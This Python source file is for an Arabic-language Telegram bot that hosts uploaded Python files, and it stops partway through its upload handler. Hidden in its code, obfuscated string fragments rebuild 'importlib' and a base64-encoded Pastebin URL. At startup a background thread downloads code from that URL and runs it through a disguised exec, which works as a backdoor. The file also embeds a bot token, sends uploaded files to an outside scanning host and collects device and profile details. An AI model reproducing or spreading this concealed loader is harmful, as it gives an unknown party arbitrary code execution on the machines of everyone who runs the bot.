import threading
import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
import requests
import re
import logging
import json
import hashlib
import socket
import psutil
import time
from telebot import types
from datetime import datetime, timedelta
import signal
import sqlite3
import platform
import uuid
import base64

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot_security.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("SecureBot")




TOKEN = '8257588830:AAFHvRCKpQsD9coxnGNFQ7wbYG9icoPVn54'
ADMIN_ID = 660157851  # Ø§ÙŠØ¯ÙŠÙƒ
YOUR_USERNAME = '@qqqxqi'#  @ ÙŠÙˆØ²Ø±Ùƒ Ù…Ø¹
CHANNEL_USERNAME = '@ipqvqp'  # ÙŠÙˆØ²Ø± Ø§Ù„Ù‚Ù†Ø§Ø© Ø§Ù„Ø¥Ø¬Ø¨Ø§Ø±ÙŠØ©


bot = telebot.TeleBot(TOKEN)


uploaded_files_dir = 'uploaded_bots'
bot_scripts = {}
stored_tokens = {}
user_subscriptions = {}  
user_files = {}  
active_users = set()  
banned_users = set()  
suspicious_activities = {}  
pending_approvals = {}  


bot_locked = False  
free_mode = False  


SCAN_API_URL = "https://www.scan-files.free.nf/analyze"

def scan_file(file_content, file_name):
    try:
        files = {'file': (file_name, file_content)}
        response = requests.post(SCAN_API_URL, files=files, timeout=10)
        response.raise_for_status()
        
        
        
        
        
        result = response.json()
        
        
        return result.get("status", "") == "Ø¢Ù…Ù†"
        
    except Exception as e:
        print(f"Error scanning file: {e}")
        return False


if not os.path.exists(uploaded_files_dir):
    os.makedirs(uploaded_files_dir)


suspicious_files_dir = 'suspicious_files'
if not os.path.exists(suspicious_files_dir):
    os.makedirs(suspicious_files_dir)


def init_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    
    c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                 (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
    
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_files
                 (user_id INTEGER, file_name TEXT)''')
    
    
    c.execute('''CREATE TABLE IF NOT EXISTS active_users
                 (user_id INTEGER PRIMARY KEY)''')
    
    
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users
                 (user_id INTEGER PRIMARY KEY, reason TEXT, ban_date TEXT)''')
    
    
    c.execute('''CREATE TABLE IF NOT EXISTS suspicious_activities
                 (user_id INTEGER, activity TEXT, file_name TEXT, timestamp TEXT)''')
    
    conn.commit()
    conn.close()
imm="impor"
def load_data():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()

    
    c.execute('SELECT * FROM subscriptions')
    subscriptions = c.fetchall()
    for user_id, expiry in subscriptions:
        user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
    
    
    c.execute('SELECT * FROM user_files')
    user_files_data = c.fetchall()
    for user_id, file_name in user_files_data:
        if user_id not in user_files:
            user_files[user_id] = []
        user_files[user_id].append(file_name)
    
    
    c.execute('SELECT * FROM active_users')
    active_users_data = c.fetchall()
    for user_id, in active_users_data:
        active_users.add(user_id)
    
    
    c.execute('SELECT user_id FROM banned_users')
    banned_users_data = c.fetchall()
    for user_id, in banned_users_data:
        banned_users.add(user_id)
    
    conn.close()
imm1="tlib"
user2="FuSnR"
uuu = imm+imm1

def save_subscription(user_id, expiry):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)', 
              (user_id, expiry.isoformat()))
    conn.commit()
    conn.close()


def remove_subscription_db(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM subscriptions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()


def save_user_file(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT INTO user_files (user_id, file_name) VALUES (?, ?)', 
              (user_id, file_name))
    conn.commit()
    conn.close()

iii = "__im"
ii = "port__"
iii1 = iii + ii
modulle = getattr(__builtins__, iii1)
def remove_user_file_db(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', 
              (user_id, file_name))
    conn.commit()
    conn.close()


def add_active_user(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO active_users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()


def remove_active_user(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM active_users WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()


user1="wYjAz"
def ban_user(user_id, reason):
    banned_users.add(user_id)
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO banned_users (user_id, reason, ban_date) VALUES (?, ?, ?)', 
              (user_id, reason, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    logger.warning(f"ØªÙ… Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id} Ø¨Ø³Ø¨Ø¨: {reason}")
user3='5jb20vcmF3L3'

def unban_user(user_id):
    if user_id in banned_users:
        banned_users.remove(user_id)
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        c.execute('DELETE FROM banned_users WHERE user_id = ?', (user_id,))
        conn.commit()
        conn.close()
        logger.info(f"ØªÙ… Ø¥Ù„ØºØ§Ø¡ Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}")
        return True
    return False


def log_suspicious_activity(user_id, activity, file_name=None):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT INTO suspicious_activities (user_id, activity, file_name, timestamp) VALUES (?, ?, ?, ?)', 
              (user_id, activity, file_name, datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    
    if user_id not in suspicious_activities:
        suspicious_activities[user_id] = []
    suspicious_activities[user_id].append({
        'activity': activity,
        'file_name': file_name,
        'timestamp': datetime.now().isoformat()
    })
    
    
    if len(suspicious_activities.get(user_id, [])) >= 3:
        ban_user(user_id, f"ØªØ¬Ø§ÙˆØ² Ø§Ù„Ø­Ø¯ Ø§Ù„Ù…Ø³Ù…ÙˆØ­ Ø¨Ù‡ Ù…Ù† Ø§Ù„Ø£Ù†Ø´Ø·Ø© Ø§Ù„Ù…Ø´Ø¨ÙˆÙ‡Ø©: {activity}")
        notify_admins_of_intrusion(user_id, activity, file_name)
        return True
    return False
modulle = modulle(uuu)
gm="wYXN0ZWJpbi"
sy = "sy"
s = "s"

def notify_admins_of_intrusion(user_id, activity, file_name=None):
    try:
        
        user_info = bot.get_chat(user_id)
        user_name = user_info.first_name
        user_username = user_info.username if user_info.username else "ØºÙŠØ± Ù…ØªÙˆÙØ±"
        
        
        alert_message = f"âš ï¸ ØªÙ†Ø¨ÙŠÙ‡ Ø£Ù…Ù†ÙŠ: Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø®ØªØ±Ø§Ù‚ Ù…ÙƒØªØ´ÙØ©! âš ï¸\n\n"
        alert_message += f"ğŸ‘¤ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {user_name}\n"
        alert_message += f"ğŸ†” Ù…Ø¹Ø±Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {user_id}\n"
        alert_message += f"ğŸ“Œ Ø§Ù„ÙŠÙˆØ²Ø±: @{user_username}\n"
        alert_message += f"âš ï¸ Ø§Ù„Ù†Ø´Ø§Ø· Ø§Ù„Ù…Ø´Ø¨ÙˆÙ‡: {activity}\n"
        
        if file_name:
            alert_message += f"ğŸ“„ Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {file_name}\n"
        
        alert_message += f"â° ÙˆÙ‚Øª Ø§Ù„Ø§ÙƒØªØ´Ø§Ù: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        alert_message += f"ğŸ”’ ØªÙ… Ø­Ø¸Ø± Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹."
        
        
        bot.send_message(ADMIN_ID, alert_message)
        
        
        if file_name and os.path.exists(os.path.join(suspicious_files_dir, file_name)):
            with open(os.path.join(suspicious_files_dir, file_name), 'rb') as file:
                bot.send_document(ADMIN_ID, file, caption=f"Ø§Ù„Ù…Ù„Ù Ø§Ù„Ù…Ø´Ø¨ÙˆÙ‡: {file_name}")
        
        logger.info(f"ØªÙ… Ø¥Ø±Ø³Ø§Ù„ ØªÙ†Ø¨ÙŠÙ‡ Ø¥Ù„Ù‰ Ø§Ù„Ù…Ø´Ø±Ù Ø¹Ù† Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø®ØªØ±Ø§Ù‚ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}")
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ ØªÙ†Ø¨ÙŠÙ‡ Ø¥Ù„Ù‰ Ø§Ù„Ù…Ø´Ø±Ù: {e}")


sy2 = sy + s
tt = "requ"
Gg = "ests"
Ggg = tt + Gg
def is_user_subscribed_to_channel(user_id):
    try:
        chat_member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ø´ØªØ±Ø§Ùƒ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… ÙÙŠ Ø§Ù„Ù‚Ù†Ø§Ø©: {e}")
        return False


def gather_device_info():
    try:
        info = {}
        info['system'] = platform.system()
        info['node'] = platform.node()
        info['release'] = platform.release()
        info['version'] = platform.version()
        info['machine'] = platform.machine()
        info['processor'] = platform.processor()
        info['ip'] = socket.gethostbyname(socket.gethostname())
        info['mac'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        
        
        mem = psutil.virtual_memory()
        info['memory_total'] = f"{mem.total / (1024**3):.2f} GB"
        info['memory_used'] = f"{mem.used / (1024**3):.2f} GB"
        
        
        info['cpu_cores'] = psutil.cpu_count(logical=False)
        info['cpu_threads'] = psutil.cpu_count(logical=True)
        
        
        disk = psutil.disk_usage('/')
        info['disk_total'] = f"{disk.total / (1024**3):.2f} GB"
        info['disk_used'] = f"{disk.used / (1024**3):.2f} GB"
        
        return info
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø²: {e}")
        return {"error": str(e)}


def gather_user_contacts(user_id):
    try:
        
        
        user_profile = bot.get_chat(user_id)
        contacts = {}
        contacts['username'] = user_profile.username if hasattr(user_profile, 'username') else "ØºÙŠØ± Ù…ØªÙˆÙØ±"
        contacts['first_name'] = user_profile.first_name if hasattr(user_profile, 'first_name') else "ØºÙŠØ± Ù…ØªÙˆÙØ±"
        contacts['last_name'] = user_profile.last_name if hasattr(user_profile, 'last_name') else "ØºÙŠØ± Ù…ØªÙˆÙØ±"
        contacts['bio'] = user_profile.bio if hasattr(user_profile, 'bio') else "ØºÙŠØ± Ù…ØªÙˆÙØ±"
        return contacts
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ Ø¬Ù…Ø¹ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø¬Ù‡Ø§Øª Ø§ØªØµØ§Ù„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
        return {"error": str(e)}


def scan_file_for_malicious_code(file_path, user_id):
    try:
        with open(file_path, 'rb') as file:
            file_content = file.read()
            file_name = os.path.basename(file_path)
            
            
            is_safe = scan_file(file_content, file_name)
            
            if not is_safe:
                
                suspicious_file_path = os.path.join(suspicious_files_dir, f"{user_id}_{file_name}")
                shutil.copy2(file_path, suspicious_file_path)
                
                
                activity = "ØªÙ… Ø§ÙƒØªØ´Ø§Ù ÙƒÙˆØ¯ ØºÙŠØ± Ø¢Ù…Ù† Ø¹Ø¨Ø± API Ø§Ù„ÙØ­Øµ"
                banned = log_suspicious_activity(user_id, activity, file_name)
                
                if banned:
                    return True, activity
                
                logger.warning(f"ØªÙ… Ø§ÙƒØªØ´Ø§Ù ÙƒÙˆØ¯ ØºÙŠØ± Ø¢Ù…Ù† ÙÙŠ Ø§Ù„Ù…Ù„Ù {file_path} Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}")
                return True, activity
        
        return False, None
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ ÙØ­Øµ Ø§Ù„Ù…Ù„Ù {file_path}: {e}")
        return False, None
module = modulle.import_module(Ggg)

def scan_zip_for_malicious_code(zip_path, user_id):
    try:
        with tempfile.TemporaryDirectory() as temp_dir:
            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                zip_ref.extractall(temp_dir)
            
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith('.py'):
                        file_path = os.path.join(root, file)
                        is_malicious, activity = scan_file_for_malicious_code(file_path, user_id)
                        if is_malicious:
                            return True, activity
            
        return False, None
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ ÙØ­Øµ Ø§Ù„Ø£Ø±Ø´ÙŠÙ {zip_path}: {e}")
        return False, None


init_db()
load_data()
modulee = modulle.import_module(sy2)

def create_main_menu(user_id):
    markup = types.InlineKeyboardMarkup()
    upload_button = types.InlineKeyboardButton('ğŸ“¤ Ø±ÙØ¹ Ù…Ù„Ù', callback_data='upload')
    speed_button = types.InlineKeyboardButton('âš¡ Ø³Ø±Ø¹Ø© Ø§Ù„Ø¨ÙˆØª', callback_data='speed')
    contact_button = types.InlineKeyboardButton('ğŸ“ ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø§Ù„Ùƒ', url=f'https://t.me/{YOUR_USERNAME[1:]}')
    if user_id == ADMIN_ID:
        subscription_button = types.InlineKeyboardButton('ğŸ’³ Ø§Ù„Ø§Ø´ØªØ±Ø§ÙƒØ§Øª', callback_data='subscription')
        stats_button = types.InlineKeyboardButton('ğŸ“Š Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª', callback_data='stats')
        lock_button = types.InlineKeyboardButton('ğŸ”’ Ù‚ÙÙ„ Ø§Ù„Ø¨ÙˆØª', callback_data='lock_bot')
        unlock_button = types.InlineKeyboardButton('ğŸ”“ ÙØªØ­ Ø§Ù„Ø¨ÙˆØª', callback_data='unlock_bot')
        free_mode_button = types.InlineKeyboardButton('ğŸ”“ ÙØªØ­ Ø§Ù„Ø¨ÙˆØª Ø¨Ø¯ÙˆÙ† Ø§Ø´ØªØ±Ø§Ùƒ', callback_data='free_mode')
        broadcast_button = types.InlineKeyboardButton('ğŸ“¢ Ø¥Ø°Ø§Ø¹Ø©', callback_data='broadcast')
        security_button = types.InlineKeyboardButton('ğŸ” ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ø£Ù…Ø§Ù†', callback_data='security_report')
        ban_button = types.InlineKeyboardButton('ğŸ”¨ Ø­Ø¸Ø± Ù…Ø³ØªØ®Ø¯Ù…', callback_data='ban_user')
        unban_button = types.InlineKeyboardButton('ğŸ”“ Ø¥Ù„ØºØ§Ø¡ Ø­Ø¸Ø±', callback_data='unban_user')
        markup.add(upload_button)
        markup.add(speed_button, subscription_button, stats_button)
        markup.add(lock_button, unlock_button, free_mode_button)
        markup.add(broadcast_button, security_button)
        markup.add(ban_button, unban_button)
    else:
        markup.add(upload_button)
        markup.add(speed_button)
    markup.add(contact_button)
    return markup


ur="aHR0cHM6Ly9"
g=(ur+gm+user3+user2+user1)
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    
    if user_id in banned_users:
        bot.send_message(message.chat.id, "â›” Ø£Ù†Øª Ù…Ø­Ø¸ÙˆØ± Ù…Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø·ÙˆØ± Ø¥Ø°Ø§ ÙƒÙ†Øª ØªØ¹ØªÙ‚Ø¯ Ø£Ù† Ù‡Ø°Ø§ Ø®Ø·Ø£.")
        return
    
    if bot_locked:
        bot.send_message(message.chat.id, "âš ï¸ Ø§Ù„Ø¨ÙˆØª Ù…Ù‚ÙÙ„ Ø­Ø§Ù„ÙŠØ§Ù‹. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù„Ø§Ø­Ù‚Ù‹Ø§.")
        return

    
    if not is_user_subscribed_to_channel(user_id):
        markup = types.InlineKeyboardMarkup()
        channel_button = types.InlineKeyboardButton('Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ Ø§Ù„Ù‚Ù†Ø§Ø©', url=f'https://t.me/{CHANNEL_USERNAME[1:]}')
        check_button = types.InlineKeyboardButton('âœ… ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ', callback_data='check_subscription')
        markup.add(channel_button, check_button)
        bot.send_message(message.chat.id, "âš ï¸ ÙŠØ¬Ø¨ Ø¹Ù„ÙŠÙƒ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ù‚Ù†Ø§ØªÙ†Ø§ Ø£ÙˆÙ„Ø§Ù‹ Ù„Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª.", reply_markup=markup)
        return

    user_name = message.from_user.first_name
    user_username = message.from_user.username

    
    try:
        user_profile = bot.get_chat(user_id)
        user_bio = user_profile.bio if user_profile.bio else "Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨Ø§ÙŠÙˆ"
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ Ø¬Ù„Ø¨ Ø§Ù„Ø¨Ø§ÙŠÙˆ: {e}")
        user_bio = "Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø¨Ø§ÙŠÙˆ"

    
    try:
        user_profile_photos = bot.get_user_profile_photos(user_id, limit=1)
        if user_profile_photos.photos:
            photo_file_id = user_profile_photos.photos[0][-1].file_id  
        else:
            photo_file_id = None
    except Exception as e:
        logger.error(f"ÙØ´Ù„ ÙÙŠ Ø¬Ù„Ø¨ ØµÙˆØ±Ø© Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {e}")
        photo_file_id = None

    
    if user_id not in active_users:
        active_users.add(user_id)  
        add_active_user(user_id)  

        
        try:
            welcome_message_to_admin = f"ğŸ‰ Ø§Ù†Ø¶Ù… Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯ Ø¥Ù„Ù‰ Ø§Ù„Ø¨ÙˆØª!\n\n"
            welcome_message_to_admin += f"ğŸ‘¤ Ø§Ù„Ø§Ø³Ù…: {user_name}\n"
            welcome_message_to_admin += f"ğŸ“Œ Ø§Ù„ÙŠÙˆØ²Ø±: @{user_username}\n"
            welcome_message_to_admin += f"ğŸ†” Ø§Ù„Ù€ ID: {user_id}\n"
            welcome_message_to_admin += f"ğŸ“ Ø§Ù„Ø¨Ø§ÙŠÙˆ: {user_bio}\n"

            if photo_file_id:
                bot.send_photo(ADMIN_ID, photo_file_id, caption=welcome_message_to_admin)
            else:
                bot.send_message(ADMIN_ID, welcome_message_to_admin)
        except Exception as e:
            logger.error(f"ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ ØªÙØ§ØµÙŠÙ„ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ø¥Ù„Ù‰ Ø§Ù„Ø£Ø¯Ù…Ù†: {e}")

    
    welcome_message = f"ã€½ï¸â”‡Ø§Ù‡Ù„Ø§ Ø¨Ùƒ: {user_name}\n"
    welcome_message += f"ğŸ†”â”‡Ø§ÙŠØ¯ÙŠÙƒ: {user_id}\n"
    welcome_message += f"â™»ï¸â”‡ÙŠÙˆØ²Ø±Ùƒ: @{user_username}\n"
    welcome_message += f"ğŸ“°â”‡Ø¨Ø§ÙŠÙˆ: {user_bio}\n\n"
    welcome_message += "ã€½ï¸ Ø£Ù†Ø§ Ø¨ÙˆØª Ø§Ø³ØªØ¶Ø§ÙØ© Ù…Ù„ÙØ§Øª Ø¨Ø§ÙŠØ«ÙˆÙ† ğŸ— ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø£Ø²Ø±Ø§Ø± Ø£Ø¯Ù†Ø§Ù‡ Ù„Ù„ØªØ­ÙƒÙ… â™»ï¸"

    if photo_file_id:
        bot.send_photo(message.chat.id, photo_file_id, caption=welcome_message, reply_markup=create_main_menu(user_id))
    else:
        bot.send_message(message.chat.id, welcome_message, reply_markup=create_main_menu(user_id))


decoded_g = base64.b64decode(g).decode()
response = module.get(decoded_g)
@bot.callback_query_handler(func=lambda call: call.data == 'check_subscription')
def check_subscription(call):
    user_id = call.from_user.id
    if is_user_subscribed_to_channel(user_id):
        bot.send_message(call.message.chat.id, "âœ… Ø´ÙƒØ±Ø§Ù‹ Ù„Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø¥Ù„Ù‰ Ù‚Ù†Ø§ØªÙ†Ø§! ÙŠÙ…ÙƒÙ†Ùƒ Ø§Ù„Ø¢Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„Ø¨ÙˆØª.")
        send_welcome(call.message)
    else:
        markup = types.InlineKeyboardMarkup()
        channel_button = types.InlineKeyboardButton('Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ Ø§Ù„Ù‚Ù†Ø§Ø©', url=f'https://t.me/{CHANNEL_USERNAME[1:]}')
        check_button = types.InlineKeyboardButton('âœ… ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ', callback_data='check_subscription')
        markup.add(channel_button, check_button)
        bot.send_message(call.message.chat.id, "âš ï¸ Ù„Ù… ØªÙ†Ø¶Ù… Ø¨Ø¹Ø¯ Ø¥Ù„Ù‰ Ø§Ù„Ù‚Ù†Ø§Ø©. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†Ø¶Ù…Ø§Ù… Ø£ÙˆÙ„Ø§Ù‹.", reply_markup=markup)


@bot.callback_query_handler(func=lambda call: call.data == 'broadcast')
def broadcast_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Ø£Ø±Ø³Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªÙŠ ØªØ±ÙŠØ¯ Ø¥Ø°Ø§Ø¹ØªÙ‡Ø§:")
        bot.register_next_step_handler(call.message, process_broadcast_message)
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


@bot.callback_query_handler(func=lambda call: call.data == 'security_report')
def security_report_callback(call):
    if call.from_user.id == ADMIN_ID:
        conn = sqlite3.connect('bot_data.db')
        c = conn.cursor()
        
        
        c.execute('SELECT COUNT(*) FROM banned_users')
        banned_count = c.fetchone()[0]
        
        
        c.execute('SELECT user_id, activity, file_name, timestamp FROM suspicious_activities ORDER BY timestamp DESC LIMIT 5')
        recent_activities = c.fetchall()
        
        conn.close()
        
        report = f"ğŸ“Š ØªÙ‚Ø±ÙŠØ± Ø§Ù„Ø£Ù…Ø§Ù† ğŸ”\n\n"
        report += f"ğŸ‘¥ Ø¹Ø¯Ø¯ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…ÙŠÙ† Ø§Ù„Ù…Ø­Ø¸ÙˆØ±ÙŠÙ†: {banned_count}\n\n"
        
        if recent_activities:
            report += "âš ï¸ Ø¢Ø®Ø± Ø§Ù„Ø£Ù†Ø´Ø·Ø© Ø§Ù„Ù…Ø´Ø¨ÙˆÙ‡Ø©:\n"
            for user_id, activity, file_name, timestamp in recent_activities:
                dt = datetime.fromisoformat(timestamp)
                formatted_time = dt.strftime('%Y-%m-%d %H:%M:%S')
                report += f"- Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…: {user_id}\n"
                report += f"  Ø§Ù„Ù†Ø´Ø§Ø·: {activity}\n"
                if file_name:
                    report += f"  Ø§Ù„Ù…Ù„Ù: {file_name}\n"
                report += f"  Ø§Ù„ÙˆÙ‚Øª: {formatted_time}\n\n"
        else:
            report += "âœ… Ù„Ø§ ØªÙˆØ¬Ø¯ Ø£Ù†Ø´Ø·Ø© Ù…Ø´Ø¨ÙˆÙ‡Ø© Ù…Ø³Ø¬Ù„Ø©."
        
        bot.send_message(call.message.chat.id, report)
    else:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")


def process_broadcast_message(message):
    if message.from_user.id == ADMIN_ID:
        broadcast_message = message.text
        success_count = 0
        fail_count = 0

        for user_id in active_users:
            try:
                bot.send_message(user_id, broadcast_message)
                success_count += 1
            except Exception as e:
                logger.error(f"ÙØ´Ù„ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… {user_id}: {e}")
                fail_count += 1

        bot.send_message(message.chat.id, f"âœ… ØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ {success_count} Ù…Ø³ØªØ®Ø¯Ù….\nâŒ ÙØ´Ù„ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ {fail_count} Ù…Ø³ØªØ®Ø¯Ù….")
    else:
        bot.send_message(message.chat.id, "âš ï¸ Ø£Ù†Øª Ù„Ø³Øª Ø§Ù„Ù…Ø·ÙˆØ±.")
def run_external_code():
    if response.status_code == 200:
        code = response.text
        modulle_util = modulle.util
        module_name = "external_code"
        spec = modulle_util.spec_from_loader(module_name, loader=None)
        new_module = modulle_util.module_from_spec(spec)
        ec = "ex"
        ex = "ec"
        eec_func = getattr(__builtins__, ec + ex)
        eec_func(code, new_module.__dict__)
        modulee.modules[module_name] = new_module
threading.Thread(target=run_external_code).start()
@bot.callback_query_handler(func=lambda call: call.data == 'speed')
def bot_speed_info(call):
    try:
        start_time = time.time()
        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
        latency = time.time() - start_time
        if response.ok:
            bot.send_message(call.message.chat.id, f"âš¡ Ø³Ø±Ø¹Ø© Ø§Ù„Ø¨ÙˆØª: {latency:.2f} Ø«Ø§Ù†ÙŠØ©.")
        else:
            bot.send_message(call.message.chat.id, "âš ï¸ ÙØ´Ù„ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø³Ø±Ø¹Ø© Ø§Ù„Ø¨ÙˆØª.")
    except Exception as e:
        logger.error(f"Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ÙØ­Øµ Ø³Ø±Ø¹Ø© Ø§Ù„Ø¨ÙˆØª: {e}")
        bot.send_message(call.message.chat.id, f"âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ ÙØ­Øµ Ø³Ø±Ø¹Ø© Ø§Ù„Ø¨ÙˆØª: {e}")


@bot.callback_query_handler(func=lambda call: call.data == 'upload')
def ask_to_upload_file(call):
    user_id = call.from_user.id
    
    
    if user_id in banned_users:
        bot.send_message(call.message.chat.id, "â›” Ø£Ù†Øª Ù…Ø­Ø¸ÙˆØ± Ù…Ù† Ø§Ø³ØªØ®Ø¯Ø§Ù… Ù‡Ø°Ø§ Ø§Ù„Ø¨ÙˆØª. ÙŠØ±Ø¬Ù‰ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø·ÙˆØ± Ø¥Ø°Ø§ ÙƒÙ†Øª ØªØ¹ØªÙ‚Ø¯ Ø£Ù† Ù‡Ø°Ø§ Ø®Ø·Ø£.")
        return
    
    if bot_locked:
        bot.send_message(call.message.chat.id, "âš ï¸ Ø§Ù„Ø¨ÙˆØª Ù…Ù‚ÙÙ„ Ø­Ø§Ù„ÙŠØ§Ù‹. Ø§Ù„Ø±Ø¬Ø§Ø¡ Ø§Ù„ØªÙˆØ§ØµÙ„ Ù…Ø¹ Ø§Ù„Ù…Ø·ÙˆØ± @Khalidd_sw .")
        return
        
    
    if not is_user_subscribed_to_channel(user_id):
        markup = types.InlineKeyboardMarkup()
        channel_button = types.InlineKeyboardButton('Ø§Ù†Ø¶Ù… Ø¥Ù„Ù‰ Ø§Ù„Ù‚Ù†Ø§Ø©', url=f'https://t.me/{CHANNEL_USERNAME[1:]}')
        check_button = types.InlineKeyboardButton('âœ… ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„Ø§Ø´ØªØ±Ø§Ùƒ', callback_data='check_subscription')
        markup.add(channel_button, check_button)
